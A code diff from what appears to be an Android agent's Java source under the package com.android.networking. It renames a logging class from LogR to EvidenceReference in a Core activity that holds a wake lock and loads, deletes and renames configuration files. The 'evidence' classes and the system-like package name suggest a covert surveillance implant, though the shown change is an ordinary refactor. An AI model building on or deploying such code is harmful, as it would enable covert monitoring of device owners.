@@ -23,7 +23,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfType;
 import com.android.networking.conf.Configuration;
 import com.android.networking.evidence.EvDispatcher;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
@@ -125,7 +125,7 @@ public class Core extends Activity implements Runnable {
 		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
 		wl.acquire();
 
-		LogR.info(Messages.getString("30.1")); //$NON-NLS-1$
+		EvidenceReference.info(Messages.getString("30.1")); //$NON-NLS-1$
 
 		serviceRunning = true;
 		return true;
@@ -472,10 +472,10 @@ public class Core extends Activity implements Runnable {
 			loaded = loadConfFile(file, true);
 
 			if (!loaded) {
-				LogR.info(Messages.getString("30.2")); //$NON-NLS-1$
+				EvidenceReference.info(Messages.getString("30.2")); //$NON-NLS-1$
 				file.delete();
 			} else {
-				LogR.info(Messages.getString("30.3")); //$NON-NLS-1$
+				EvidenceReference.info(Messages.getString("30.3")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -492,7 +492,7 @@ public class Core extends Activity implements Runnable {
 				loaded = loadConfFile(file, true);
 
 				if (!loaded) {
-					LogR.info(Messages.getString("30.4")); //$NON-NLS-1$
+					EvidenceReference.info(Messages.getString("30.4")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
